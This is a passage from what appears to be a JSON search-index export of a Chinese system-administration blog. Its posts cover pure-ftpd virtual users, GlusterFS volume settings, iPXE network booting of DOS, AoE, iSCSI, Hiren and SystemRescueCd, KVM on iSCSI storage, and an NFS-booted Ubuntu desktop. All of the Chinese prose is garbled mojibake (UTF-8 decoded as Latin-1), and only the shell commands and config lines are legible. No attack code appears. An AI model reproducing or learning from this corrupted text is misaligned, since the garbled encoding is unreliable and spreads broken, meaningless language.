8#æ³¨æ„ï¼Œè¿™é‡Œå°±æŒ‡å‡ºäº†æœ€å°uidï¼Œæ‰€ä»¥ç¬¬ä¸€æ­¥å»ºç«‹ç”¨æˆ·çš„æ—¶å€™uidä¸èƒ½å°äº500ï¼Œå¦åˆ™pure-ftpdæ— æ³•è®¤è¯ 9MinUID 500 10CreateHomeDir yes æ”¹å®Œåï¼Œæˆ‘ä»¬æ¥å¢åŠ ä¸ªç”¨æˆ·ï¼Œæ³¨æ„è¯­æ³•ï¼Œtestæ˜¯è™šæ‹Ÿç”¨æˆ·åï¼Œ-uå’Œ-gæ˜¯è™šæ‹Ÿç”¨æˆ·å¯¹åº”linuxç³»ç»Ÿçš„ç³»ç»Ÿç”¨æˆ·ï¼Œå°±æ˜¯æˆ‘ä»¬ç¬¬ä¸€æ­¥å»ºç«‹çš„é‚£ä¸ªæ— ç™»é™†æƒçš„ftpuserï¼Œ-dæ˜¯homeç›®å½•ï¼Œè¿™ä¸ªä¸ç”¨å»ºï¼Œç”¨æˆ·ç¬¬ä¸€æ¬¡ç™»é™†çš„æ—¶å€™pure-ftpdä¼šè‡ªåŠ¨å»ºç«‹ï¼š\n1pure-pw useradd test -u ftpuser -g ftpuser -d /var/www/ppp é‡å»ºhash\n1pure-pw mkdb é‡å¯pure-ftpd\n1service restart pure-ftpd okï¼Œæå®šäº†ï¼Œä¸€å®šè¦æ³¨æ„uidçš„é—®é¢˜ã€‚å…¶ä»–æ— å¤æ‚çš„åœ°æ–¹ã€‚\n","date":"2024-01-18","img":"","permalink":"https://rendoumi.com/posts/20240118-pure-ftpd/","series":null,"tags":null,"title":"Linuxä¸‹virtual FTPçš„æ­å»ºpure-Ftpd"},{"categories":null,"content":"åŸºæœ¬ä¸Šæ­å»ºglusterfséƒ½æ˜¯ç”¨äº†2ä¸ªå‰¯æœ¬ï¼Œç”¨æ¥ä¿è¯æ•°æ®å†—ä½™\nå»ºç«‹æ–°å·ï¼Œ/export/test-volç›®å½•ä¸ç”¨äº‹å…ˆå»ºç«‹ï¼Œä¼šè‡ªåŠ¨å»ºç«‹çš„ï¼š\n1gluster volume create test-vol replica 2 transport tcp 172.16.8.5:/export/test-vol/ 172.16.8.6:/export/test-vol/ å¦‚ä¸Šå»ºç«‹æ–°å·åï¼Œtest-volçš„å±ä¸»æ˜¯rootï¼Œå¦‚æœæˆ‘ä»¬æƒ³åŸºäºgfsä¹‹ä¸Šåšä¸ªè™šæ‹Ÿçš„vsftpdï¼Œå»ºè®¾ç”¨æˆ·æ˜¯virtual.virtualï¼Œ500.500\nè®¾ç½®å·uid/gidå±æ€§ï¼š\n1gluster volume set test-vol storage.owner-uid 500 2gluster volume set test-vol storage.owner-gid 500 è®¾ç½®å·çš„quotaç©ºé—´é…é¢ï¼š\n1gluster volume quota test-vol enable 2gluster volume quota test-vol limit-usage / 10GB 3gluster volume quota test-vol limit-usage /path/in/volume 2G 4gluster volume set test-vol features.quota-timeout 30 5gluster volume quota test-vol list 6gluster volume quota test-vol list /path/in/volume å»æ‰quotaé™åˆ¶ï¼š\n1gluster volume quota test-vol remove / 2gluster volume quota test-Vol remove /path/in/volume ä¼˜åŒ–tcpå‚æ•°ï¼š\n1gluster volume set test-vol diagnostics.brick-log-level WARNING 2gluster volume set test-vol diagnostics.client-log-level WARNING 3gluster volume set test-vol nfs.enable-ino32 on 4gluster volume set test-vol nfs.addr-namelookup off 5gluster volume set test-vol nfs.disable on 6gluster volume set test-vol performance.cache-max-file-size 2MB 7gluster volume set test-vol performance.cache-refresh-timeout 4 8gluster volume set test-vol performance.cache-size 256MB 9gluster volume set test-vol performance.write-behind-window-size 4M 10gluster volume set test-vol performance.io-thread-count 32 è®¾ç½®å·è®¿é—®æƒé™\n1gluster volume set test-vol auth.allow 192.168.2.* 2gluster volume set test-vol auth.reject 192.168.2.* ç›‘æ§\n1gluster volume profile zfws-vol start 2gluster volume profile zfws-vol info ","date":"2024-01-18","img":"","permalink":"https://rendoumi.com/posts/20240118-gfs/","series":null,"tags":null,"title":"GlusterFSçš„æ—¥å¸¸åº”ç”¨"},{"categories":null,"content":"åœ¨åšpxelinuxå¯åŠ¨çš„è¿‡ç¨‹ä¸­ï¼Œä¸å¯é¿å…çš„ä¼šç”¨åˆ°èœå•é€‰é¡¹ã€‚æœ‰ä¸¤ä¸ªé€‰æ‹©ï¼Œmenu.c32 å’Œ vesamenu.c32ã€‚\næ•ˆæœå¦‚ä¸‹ï¼š menu.c32 vesamenu.c32 åŒºåˆ«å°±æ˜¯ä¸€ä¸ªåœ°æ–¹ï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹é…ç½®æ–‡ä»¶ï¼š\n1default vesamenu.c32 2PROMPT 0 3NOESCAPE 0 4ALLOWOPTIONS 0 5TIMEOUT 200 6 7 8MENU TITLE Boot Menu 9 10LABEL Ghost_Client_UNDI 11 MENU LABEL ^1. Ghost Client UNDI 12 MENU DEFAULT 13 kernel memdisk 14 append keeppxe initrd=imz/Client_undi.imz 15 16LABEL Ghost_Client_NDIS 17 MENU LABEL ^2. Ghost Client NDIS 18 kernel memdisk 19 APPEND keeppxe initrd=imz/Client_ndis.IMZ 20 21LABEL WinPE 22 MENU LABEL ^3. WinPE 2.0 23 KERNEL boot/pxeboot.0 24 25LABEL PartedMagic 26 MENU LABEL ^4. Parted Magic 27 kernel utils/pmagic/bzImage 28 29LABEL Local_Drive 30 MENU LABEL ^5. Boot Local Drive 31 # localboot 0 32 KERNEL chain.c32 33 APPEND hd0 0 åŒºåˆ«å°±æ˜¯ç¬¬ä¸€è¡Œ:\nmenu.c32 æ˜¯ UI menu.c32\nvesamenu.c32 æ˜¯ default vesamenu.c32\nä¸ªäººè¿˜æ˜¯è§‰å¾—menu.c32æ¯”è¾ƒå¥½ï¼Œä¹ æƒ¯äº†è¿™ç§è“è‰²ã€‚\né‚£ä¹ˆï¼Œæˆ‘ä»¬å¦‚æœæƒ³æŠŠpxelinux.0ã€menu.c32ã€vesamenu.c32éƒ½æ‰”åˆ°/ks/pxelinuxçš„å­ç›®å½•ä¸‹ï¼Œè€Œä¸æ˜¯æ‰”åœ¨/ksçš„æ ¹ç›®å½•ä¸‹ï¼Œé‚£ä¹ˆé…ä¸€ä¸‹dnsmasqçš„209å’Œ210å³å¯ï¼Œçœ‹ä¸€ä¸‹boot2.phpæ–‡ä»¶ï¼š\n1 case \u0026#39;\\52:54:00:7f:65:bb\u0026#39;: 2 echo \u0026#34;set 209:string vesamenu.conf\\n\u0026#34;; 3 echo \u0026#34;set 210:string http://172.16.8.1/ks/pxelinux/\\n\u0026#34;; 4 echo \u0026#34;chain http://172.16.8.1/ks/pxelinux/pxelinux.0\\n\u0026#34;; 5 break; ","date":"2024-01-18","img":"","permalink":"https://rendoumi.com/posts/20240118-ipxe_menu/","series":null,"tags":null,"title":"Ipxeä¸­menu.c32å’Œvesamenu.c32çš„ç”¨æ³•"},{"categories":null,"content":"å¤ªå¤è€çš„å‘½é¢˜äº†ï¼Œå¦‚æœæƒ³ç©Dos 6.22ä¹‹ä¸‹çš„æ¸¸æˆï¼Œé‚£å°±éœ€è¦å¼•åŠ¨ä¸€ä¸ªDosç³»ç»Ÿäº†ã€‚\nç³»ç»Ÿæ–‡ä»¶å€’æ˜¯ç°æˆçš„ï¼ŒDos6.22.imgã€‚\nå¦‚ä½•åšä¸ªipxeçš„å¯åŠ¨å‘¢ï¼Ÿ\nç®€å•ï¼Œä¾æ ·ç”»è‘«èŠ¦ï¼Œä¿®æ”¹boot2.php\n1 case \u0026#39;\\52:54:00:7f:65:bb\u0026#39;: 2 echo \u0026#34;initrd http://172.16.8.1/ks/dos/Dos6.22.img\\n\u0026#34;; 3 echo \u0026#34;chain http://172.16.8.1/ks/dos/memdisk\\n\u0026#34;; 4 break; memdiskæ˜¯ä»syslinuxä¸­æ‹·è´çš„ï¼Œä¹Ÿæ˜¯ç¥å™¨ã€‚\nå…¶å®å¯ä»¥ç”¨sanbootæ¥å¯åŠ¨çš„ï¼Œä½†æ˜¯é‚£æ ·èµ·åŠ¨èµ·æ¥çš„ç³»ç»Ÿå¯¹Cç›˜æ— å†™æƒé™ï¼Œå› ä¸ºdosä¸‹æ²¡æœ‰sançš„é©±åŠ¨å¯ç”¨ã€‚\næ‰€ä»¥æ”¹ç”¨memdiskï¼Œè¿™æ ·æƒé™å˜ä¸ºå¯å†™çš„äº†ã€‚\n","date":"2024-01-18","img":"","permalink":"https://rendoumi.com/posts/20240118-ipxe_dos/","series":null,"tags":null,"title":"Ipxeå¯åŠ¨Dos 6.22"},{"categories":null,"content":"å…ˆæ™®åŠä¸€ä¸‹ï¼Œaoeï¼ˆata over ethernetï¼‰ï¼Œè·Ÿiscsiå·®ä¸å¤šï¼Œä¸è¿‡æ˜¯ç¡¬ç›˜åè®®èµ°åœ¨äº†ä»¥å¤ªç½‘ä¸Šã€‚iscsiæ˜¯3å±‚çš„åè®®ï¼Œaoeæ˜¯äºŒå±‚çš„åè®®ã€‚\nå› ä¸ºæ˜¯äºŒå±‚çš„ï¼Œæ‰€ä»¥æ²¡æœ‰ç½‘å…³ã€è·¯ç”±ç­‰ç­‰ï¼Œç›¸å¯¹å¼ºåˆ¶çš„ï¼Œå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç«¯å¿…é¡»æ˜¯ä½äºåŒä¸€å­ç½‘å†…ã€‚\nå…ˆè£…æœåŠ¡ç«¯vbladeï¼š\n1yum install vblade ç„¶åå‡†å¤‡å­˜å‚¨ç©ºé—´ï¼Œåƒlvã€rawæ–‡ä»¶ã€ç¡¬ç›˜(/dev/sdb)ã€ç¡¬ç›˜åˆ†åŒº(/dev/sdb1)æˆ–è€…raidç£ç›˜/dev/md0éƒ½å¯ä»¥ç”¨ä½œå‚¨å­˜ã€‚\nåšä¸€å—20Gçš„rawæ–‡ä»¶å­˜å‚¨ç©ºé—´ï¼š\n1mkdir /storage 2dd if=/dev/zero of=/storage/storage1.img bs=1024k count=20000 åšä¸€å—aoeç¡¬ç›˜ï¼š\n1vbladed 65535 255 eth0 /storage/storage1.img è§£é‡Šä¸€ä¸‹ vbladed åé¢è·Ÿäº†2ä¸ªæ•°å­—ï¼Œç¬¬ä¸€ä¸ªæ˜¯ä¸»åºåˆ—å·ï¼Œå¯ä»¥ä» 0-65535ï¼Œç¬¬äºŒä¸ªæ˜¯æ¬¡åºåˆ—å·ï¼Œå¯ä»¥ä»0-255ã€‚ç„¶åè·Ÿå‘å¸ƒçš„ç½‘å¡ï¼Œæœ€åæ˜¯å­˜å‚¨ç©ºé—´ã€‚\næœ€å¥½æŠŠvbladedæ”¾å…¥/etc/rc.d/rc.local\n1vi /etc/rc.local 2vbladed 65535 255 eth0 /storage/storage1.img okï¼ŒæœåŠ¡å™¨ç«¯çš„å·¥ä½œå°±å®Œæˆäº†ï¼Œå¤§å®¶çœ‹åˆ°äº†ï¼ŒåŸºæœ¬ä»€ä¹ˆä¹Ÿæ²¡è®¾ï¼Œå› ä¸ºæ˜¯èµ°åœ¨äºŒå±‚ä¹ˆã€‚\nç„¶åipxeéƒ¨åˆ†å°±ç®€å•äº†ï¼Œä¾æ ·ç”»è‘«èŠ¦ä¿®æ”¹boot2.phpï¼š\n1 case \u0026#39;\\52:54:00:d9:fe:43\u0026#39;: 2 echo \u0026#34;set keep-san 1\\n\u0026#34;; 3 echo \u0026#34;sanboot aoe:e65535.255\\n\u0026#34;; 4 break; æå®š\n","date":"2024-01-18","img":"","permalink":"https://rendoumi.com/posts/20240118-ipxe_aoe/","series":null,"tags":null,"title":"Ipxeä¸aoeå¯åŠ¨"},{"categories":null,"content":"æŒ‰ä¸Šä¸€ç¯‡æ‰€è¯´ï¼Œæˆ‘ä»¬å·²ç»å¼„äº†ä¸ªiscsiä¸Šé¢çš„win7å·ï¼Œå…¶å®å°±æ˜¯æŠŠèåœèŠ±å›­çš„win7 cloneåˆ°äº†ä¸€ä¸ª10Gçš„æ–‡ä»¶å·ä¸Šã€‚\nå¼•ç”³é—®é¢˜ï¼š å¤§å®¶å…¶å®å¯ä»¥ç”¨qcow2çš„æ–‡ä»¶æ ¼å¼ä¿å­˜çš„ï¼š\n1qemu-img create -f qcow2 /export/iscsi/windows7.qcow2 60G 2vi /etc/tgt/targets.conf 3 4\u0026lt;target iqn.2016-07.com.renhe:renhe-16-8-6.disk03\u0026gt; 5 backing-store /export/iscsi/disk03.img 6 backing-store /export/iscsi/windows7.qcow2 7 write-cache off 8\u0026lt;/target\u0026gt; 9 10tgt-admin --execute é‚£ä¹ˆï¼Œæˆ‘ä»¬å¦‚ä½•è®©ipxeç›´æ¥èµ·åŠ¨è¿™ä¸ªiscsiå·å‘¢ï¼Ÿ è¿˜æ˜¯ç¼–è¾‘boot2.phpå³å¯ï¼š\n1 case \u0026#39;\\52:54:00:d9:fe:43\u0026#39;: 2 echo \u0026#34;sanboot iscsi:172.16.8.6::3260:1:iqn.2016-07.iscsi:disk03\\n\u0026#34;; 3 break; æ³¨æ„å•Šï¼ŒæŸ¥éå¾ˆå¤šç½‘ä¸Šèµ„æ–™ï¼š sanbootçš„å‚æ•°éƒ½æ˜¯iscsi:ip::::iqnï¼Œå®é™…æ— è®ºæ˜¯å®ä½“æœºçš„pxeï¼Œè¿˜æ˜¯kvmè™šæ‹Ÿæœºçš„pxeï¼Œéƒ½æ— æ³•å¯åŠ¨ã€‚ä»¥ä¸‹æ ¼å¼æ‰æ˜¯æ­£ç¡®çš„ï¼š iscsi:ip::3260:1:iqn\nè¿™æ ·è£…ä¸ªwin7å°±ç®€å•äº†ï¼Œæ‹·è´ä¸€ä¸‹disk03.imgè¿™ä¸ªæ¨¡æ¿ï¼Œå¯åŠ¨pxeå³å¯\n1#!/bin/bash 2virt-install \\ 3--name=pxe-16-11-8 \\ 4--vcpu=2 \\ 5--ram=4096 \\ 6--nodisks \\ 7--boot network \\ 8--os-type=windows \\ 9--os-variant=win7 \\ 10--network bridge=br0 \\ 11--vnc --vnclisten=0.0.0.0 --vncport=5910 ä»¥åå°±å¯ä»¥ç”¨è¿™ä¸ªåŠæ³•ç¬é—´å¼„å‡ºä¸€å †winè™šæœºäº†ï¼Œç”¨å®Œå°±åˆ é™¤\n","date":"2024-01-18","img":"","permalink":"https://rendoumi.com/posts/20240118-ipxe_iscsi/","series":null,"tags":null,"title":"Ipxeè¿œç¨‹å¯åŠ¨iscsiä¸Šé¢çš„å…‹éš†å·"},{"categories":null,"content":"æœ€è¿‘éƒ½åœ¨ç ”ç©¶ipxeå’Œiscsiï¼Œé‚£ä¹ˆå¦‚ä½•è®©kvmä½¿ç”¨å­˜å‚¨åœ¨iscsiä¸Šé¢çš„æ–‡ä»¶å·å‘¢ï¼Ÿ\nå‡è®¾æˆ‘ä»¬å·²ç»æŒ‰ä¹‹å‰çš„æ–‡ç« æ¶å¥½äº†iscsiï¼š\né€ ä¸ª10Gæ–‡ä»¶:\n1dd if=/dev/zero of=/export/iscsi/disk03.img count=0 bs=1 seek=10G æœåŠ¡ç«¯å¢åŠ iscsi target\n1vi /etc/tgt/targets.conf 2 3\u0026lt;target iqn.2016-07.com.renhe:renhe-16-8-6.disk03\u0026gt; 4 backing-store /export/iscsi/disk03.img 5 write-cache off 6\u0026lt;/target\u0026gt; 7 8tgt-admin --execute isciå‡†å¤‡å¥½äº†ï¼Œç„¶åæˆ‘ä»¬å»kvmå®šä¹‰æ± å­ï¼šmyiscsi\n1virsh 2 3virsh# pool-define-as myiscsi 172.16.8.6 - iqn.2016-07.com.renhe:renhe-16-8-6.disk03 - /dev/disk/by-path 4 5virsh# pool-start myiscsi 6Name State Autostart 7----------------------------------------- 8myiscsi active no 9 10virsh# pool-autostart myiscsi 11 12virsh # pool-list 13Name State Autostart 14----------------------------------------- 15myiscsi active yes 16 17virsh# vol-list myiscsi 18Name Path 19----------------------------------------- 20unit:0:0:1 /dev/disk/by-path/ip-172.16.8.6:3260-iscsi-iqn.2016-07.com.renhe:renhe-16-8-6.disk03-lun-1 okï¼Œè®°ä¸‹æ¥è¿™ä¸ªNameï¼šunit:0:0:1\nç„¶åæˆ‘ä»¬æ¥å®‰è£…winçš„kvmå§ï¼Œç›´æ¥cloneè¾“å‡ºåˆ°ç¡¬ç›˜\n1virt-install \\ 2--name=iscsi-16-11-9 \\ 3--vcpu=2 \\ 4--ram=4096 \\ 5--cdrom=/export/kvm/iso/Luobo_Ghost_Win7_SP1_x86_2015_0904.iso \\ 6--boot network,cdrom,hd,menu=on \\ 7--disk vol=myiscsi/unit:0:0:1 \\ 8--os-type=windows \\ 9--os-variant=win7 \\ 10--network bridge=br0 \\ 11--vnc --vnclisten=0.0.0.0 --vncport=5911 æ³¨æ„ä¸Šé¢diskçš„å‚æ•°ï¼Œmyiscsi/unit:0:0:1\nå¯åŠ¨åå°±ç›´æ¥å¼€å§‹å®‰è£…äº†ï¼Œé€‰è¿è¡ŒGhost11:\nç„¶åæŠŠwin7.ghoç»™cloneåˆ°10Gçš„ç›˜ä¸Šï¼š\né‡å¯åè¯·åœæ‰è™šæœºï¼Œç„¶åæŠŠè¿™ä¸ªcloneå¥½çš„åˆ†åŒºæ–‡ä»¶disk03.imgä¿å­˜ä¸€ä»½ï¼Œä¸‹æ¬¡å°±å¯ä»¥ç›´æ¥å¤åˆ¶åˆ°æ± å­é‡Œä¾›æ–°å»ºçš„è™šæœºç”¨äº†ï¼Œå“ˆå“ˆã€‚\n","date":"2024-01-18","img":"","permalink":"https://rendoumi.com/posts/20240118-kvm_iscsi/","series":null,"tags":null,"title":"Kvmä½¿ç”¨iscsiä½œä¸ºå­˜å‚¨æ± å®‰è£…win"},{"categories":null,"content":"æˆ‘ä»¬å¸Œæœ›æœ‰ç´§æ€¥æƒ…å†µå‡ºç°çš„æ—¶å€™ï¼Œipxeå¯ä»¥ç”¨systemrecuecdæ•‘æ€¥ï¼Œå¯èƒ½ä¹Ÿå¸Œæœ›æœºå™¨ä¸Šæ¶å‰æµ‹æµ‹å†…å­˜ã€åˆ†åŒºã€èµ·ä¸ªwinpeç­‰ç­‰ã€‚è¿™æ—¶å€™å°±è¦ç”¨åˆ°hirenè¿™ä¸ªå·¥å…·äº†ï¼Œè¿™ä¸ªä¸œè¥¿å°±æ˜¯å›½å¤–çš„è€æ¯›æ¡ƒå·¥å…·ç®±ï¼\nå¾ˆç®€å•ï¼Œä¿®æ”¹boot2.php\n1 case \u0026#39;\\52:54:00:a7:ef:5d\u0026#39;: 2 echo \u0026#34;initrd http://172.16.8.1/ks/winpe/Hiren.iso\\n\u0026#34;; 3 echo \u0026#34;chain http://172.16.8.1/ks/winpe/memdisk iso raw\\n\u0026#34;; 4 break; memdiskä»syslinuxé‡Œé¢æ‹·è´å³å¯ã€‚\nè¿™æ ·å°±æœ‰ä¸€ä¸ªä¸‡ç”¨å·¥å…·å¯ç”¨äº†,isoå¯åŠ¨éƒ½å¯ä»¥é‡‡ç”¨è¿™ç§æ–¹å¼å“¦ã€‚\n","date":"2024-01-18","img":"","permalink":"https://rendoumi.com/posts/20240118-ipxe_hiren/","series":null,"tags":null,"title":"IPXEä¸‡èƒ½å·¥å…·hiren.isoçš„å¯åŠ¨æ–¹å¼"},{"categories":null,"content":"æ—¢ç„¶ç”¨åˆ°ipxeï¼Œå°±è¯•è¯•è¿œç¨‹è¿è¡Œsystemrecuecdã€‚ä¸‡ä¸€ç³»ç»Ÿå‡ºæ¯›ç—…ï¼Œå¯ä»¥ç”¨æ¥æ¢å¤æˆ–è€…æ€¥æ•‘ã€‚\nä¸‹è½½cd\n1wget http://downloads.sourceforge.net/project/systemrescuecd/sysresccd-x86/4.7.3/systemrescuecd-x86-4.7.3.iso è£…è¿› http://172.168.8.1/ks/sysrcdç›®å½•ä¸­\n1mount -o loop systemrescuecd-x86-4.7.3.iso /mnt/iso 2mkdir -p /var/www/html/ks/sysrcd 3cp -r /mnt/iso/* /var/www/html/ks/sysrcd é‡å¤´æˆï¼Œä¾ç„¶æŒ‰å‰é¢çš„æ–¹æ³•ä¿®æ”¹boot2.phpå³å¯\n1 case \u0026#39;\\ec:f4:bb:d9:96:40\u0026#39;: 2 $ip=\u0026#34;172.16.36.2:172.16.37.254:255.255.254.0:myhost-16-36-2\u0026#34;; 3 $ipa=explode(\u0026#39;:\u0026#39;,$ip); 4 echo \u0026#34;ifopen net0\\n\u0026#34;; 5 echo \u0026#34;set net0/ip $ipa[0]\\n\u0026#34;; 6 echo \u0026#34;set net0/netmask $ipa[2]\\n\u0026#34;; 7 echo \u0026#34;set net0/gateway $ipa[1]\\n\u0026#34;; 8 echo \u0026#34;set net0/dns $dns\\n\u0026#34;; 9 echo \u0026#34;set base-url http://172.16.8.1/ks/sysrcd\\n\u0026#34;; 10 echo \u0026#34;kernel \\${base-url}/isolinux/rescue32 netboot=\\${base-url}/sysrcd.dat nodhcp eth0=172.16.36.2/23 dns=172.16.8.1 gateway=172.16.37.254 rootpass=xxxxxxxx vncserver=1:password nameif=eth0:ec:f4:bb:d9:96:40\\n\u0026#34;; 11 echo \u0026#34;initrd ${base-url}/isolinux/initram.igz\\n\u0026#34;; 12 echo \u0026#34;boot\\n\u0026#34;; 13 break; æ³¨æ„ä¸Šé¢ï¼Œé™æ€ipçš„è®¾ç½®éƒ¨åˆ†ï¼Œè¿˜æœ‰åŒæ—¶è®¾ç½®äº†sshdå’Œvncserverï¼Œæ–¹ä¾¿è¿œç¨‹æ“ä½œã€‚\n","date":"2024-01-18","img":"","permalink":"https://rendoumi.com/posts/20240118-ipxe_sysrecuecd/","series":null,"tags":null,"title":"IPXEè¿œç¨‹è¿è¡Œsysrecuecdç³»ç»Ÿ"},{"categories":null,"content":"æœ‰äº†ä¸Šç¯‡IPXEçš„å¯åŠ¨æ–¹æ³•ï¼Œæˆ‘ä»¬æ¥å¯åŠ¨ä¸€ä¸ªUbuntuæ¥ç©ï¼š\nç®€å•çš„ä¿®æ”¹boot2.phpå³å¯ï¼š\n1 case \u0026#39;\\ec:f4:bb:d9:96:40\u0026#39;: 2 $ip=\u0026#34;172.16.36.2:172.16.37.254:255.255.254.0:myhost-16-36-2\u0026#34;; 3 $ipa=explode(\u0026#39;:\u0026#39;,$ip); 4 echo \u0026#34;ifopen net0\\n\u0026#34;; 5 echo \u0026#34;set net0/ip $ipa[0]\\n\u0026#34;; 6 echo \u0026#34;set net0/netmask $ipa[2]\\n\u0026#34;; 7 echo \u0026#34;set net0/gateway $ipa[1]\\n\u0026#34;; 8 echo \u0026#34;set net0/dns $dns\\n\u0026#34;; 9 echo \u0026#34;kernel http://172.16.8.1/ks/ubuntu/vmlinuz.efi root=/dev/nfs boot=casper netboot=nfs nfsroot=172.16.11.6:/root/ubuntu ip=172.16.36.2::172.16.37.254:255.255.254.0:renhe-16-36-2:eno1 ro\\n\u0026#34;; 10 echo \u0026#34;initrd http://172.16.8.1/ks/ubuntu/initrd.lz\\n\u0026#34;; 11 echo \u0026#34;boot\\n\u0026#34;; 12 break; æ³¨æ„ï¼šå˜çš„å°±æ˜¯kernelå’Œinité‚£ä¸¤è¡Œï¼Œnetbootæ”¯æŒnfså’Œcifsï¼Œä¸æ”¯æŒhttpå•Šï¼Œè¯•äº†åŠå¤©ï¼å¦å¤–ipé‚£ä¸€è¡Œï¼Œå¦‚æœæ˜¯åŠ¨æ€çš„ï¼Œip=dhcpï¼Œå¦‚æœæ˜¯é™æ€çš„ï¼Œæ ¼å¼å¦‚ä¸‹ï¼š\nip=å®¢æˆ·ç«¯ip:æœåŠ¡å™¨ç«¯ip:ç½‘å…³:æ©ç :ä¸»æœºå:ç½‘å¡\næœåŠ¡å™¨ç«¯ipä¸å¡«ï¼Œä¸»æœºåä¹Ÿå¯ä»¥ä¸å¡«ã€‚\né¦–å…ˆæˆ‘ä»¬è¦å»ä¸‹ä¸ªISO\n1wget http://mirrors.163.com/ubuntu-releases/16.04/ubuntu-16.04-desktop-amd64.iso ç„¶åæŠŠvmlinuz.efiå’Œinitrd.lzå¼„å‡ºæ¥ï¼Œæ”¾åˆ°[http://172.16.8.1/ks/ubuntu ]ç›®å½•ä¸‹\n1mount -o loop ubuntu-16.04-desktop-amd64.iso /mnt/iso 2cp /mnt/iso/casper/vmlinuz.efi /var/www/html/ks/ubuntu 3cp /mnt/iso/casper/initrd.lz /var/www/html/ks/ubuntu ç„¶åå»ºç«‹nfsï¼ŒæŠŠisoé‡Œçš„ä¸œè¥¿éƒ½å¼„åˆ°nfså…±äº«é‡Œå»ï¼š\n1mkdir -p /export/ubuntu 2vi /etc/exports 3/export/ubuntu *(rw,sync,no_subtree_check,fsid=0,no_root_squash) 4 5yum install -y nfs-utils rpcbind 6service nfs start okï¼Œå¯åŠ¨pxeï¼Œå°±çœ‹åˆ°æ¡Œé¢äº†ã€‚ ","date":"2024-01-18","img":"","permalink":"https://rendoumi.com/posts/20240118-pxe_utuntu_desk/","series":null,"tags":null,"title":"ç”¨IPXEå¯åŠ¨ä¸ªUbuntuæ¡Œé¢"},{"categories":null,"content":"è¿™äº›å¹´IDCç‰©ç†æœºè£…æœºçš„å¤§æ³•ä¹Ÿåœ¨ä¸æ–­è¡è¿›ï¼Œä»æœ€æ—©çš„æ‰‹åŠ¨è£…ä¸€å †tftp/dhcp/syslinux/httpdï¼Œåˆ°cobblerçš„ä¸€ç»Ÿæ±Ÿæ¹–ï¼Œåˆ°ç°åœ¨çš„dnsmasqè½»é‡çº§å®‰è£…ï¼Œnocpså®‰è£…ï¼Œä¸€ç›´åœ¨ä¸æ–­è¿›åŒ–ç€ã€‚\nå› ä¸ºcobblerå®åœ¨å¤ªé‡ï¼Œä¸å¾—ä¸ä¸“é—¨èµ·ä¸€ä¸ªkvmè™šæœºæ¥è¿è¡Œï¼Œå®Œå…¨ä¸å–œæ¬¢å•Šã€‚æ‰€ä»¥ä¸€ç›´ä¹Ÿåœ¨ç ”ç©¶ç»ˆæå®‰è£…æœåŠ¡å™¨çš„å¤§æ³•ã€‚\næŠ˜è…¾æœåŠ¡å™¨æ— æ•°å›ï¼Œæ‰¾å‡ºäº†ä¸ªè‡ªå·±æ¯”è¾ƒå–œæ¬¢çš„æ–¹å¼ã€‚\né¦–å…ˆä»‹ç»ä¸€ä¸‹èƒŒæ™¯çŸ¥è¯†ï¼š\nPXE å¯ä»¥é€šè¿‡ç½‘ç»œç»™è®¡ç®—æœºå®‰è£…æ“ä½œç³»ç»Ÿã€‚ PXEåè®®å¤§è‡´ä¸Šç»“åˆäº†DHCPå’ŒTFTPã€‚\ngPXE gPXEæ˜¯PXEçš„ä¸€ä¸ªå¼€æºå®ç°ï¼ˆæ›´æ—©çš„å®ç°æ˜¯Etherbootï¼‰ã€‚é€šè¿‡gPXEèƒ½è®©ç½‘å¡ç›´æ¥æ”¯æŒç½‘ç»œå¯åŠ¨ï¼Œè€Œä¸ä¾èµ–äºç½‘å¡è‡ªå¸¦çš„PXEå›ºä»¶ã€‚åŒæ—¶ç›¸æ¯”PXEï¼ŒgPXEæ”¯æŒæ›´å¤šçš„åè®®ã€‚ ä¼ ç»Ÿçš„PXEåªèƒ½é€šè¿‡TFTPè¿›è¡Œä¼ è¾“ï¼Œè€ŒgPXEæ”¯æŒHTTPï¼ŒiSCSIå’ŒATA over Ethernetï¼ˆAoEï¼‰ï¼Œç”šè‡³æ”¯æŒwifié“¾æ¥ã€‚\niPXE iPXEè¡¨ç¤º it doesn\u0026rsquo;t PXEã€‚iPXEæ˜¯gPXEçš„åŸç­äººé©¬å†™çš„ï¼ˆä»–ä»¬ä»Etherbootå¼€å§‹ï¼‰ï¼Œä½œä¸ºå®˜æ–¹çš„gPXEçš„æ›¿ä»£å“ã€‚ gPXEæ‰©å±•çš„åŠŸèƒ½åœ¨iPXEä¸­éƒ½å¾—åˆ°æ”¯æŒã€‚ ä¹‹æ‰€ä»¥ä¸å†ä½¿ç”¨gPXEæ˜¯ç”±äºå­˜åœ¨ç‰ˆæƒçº çº·ï¼ŒiPXEä»2010å¹´4æœˆå¼€å§‹ï¼ŒåŸºäºåŒä¸€ä¸ªä»£ç åº“å¼€å§‹å¼€å‘ã€‚\nPXELINUX Syslinuxæ˜¯ä¸€ä¸ªä¼˜ç§€çš„ç³»ç»Ÿå¯åŠ¨åŠ è½½å™¨(bootloader)ï¼Œå¯å¼•å¯¼è‡ªç¡¬ç›˜ã€å…‰ç›˜ã€å’Œé€šè¿‡PXEçš„ç½‘ç»œå¯åŠ¨ã€‚ PXELINUXæ´¾ç”Ÿè‡ªSyslinuxï¼Œç”¨æ¥ä½¿æ”¯æŒPXEçš„ç½‘å¡ä»ç½‘ç»œå¼•å¯¼å¯åŠ¨Linuxã€‚PXELINUXç¨‹åºä¸æ˜¯çƒ§åœ¨ç½‘å¡é‡Œï¼Œè€Œæ˜¯å­˜å‚¨åœ¨TFTPæœåŠ¡å™¨ä¸Šã€‚\nChainloading iPXE 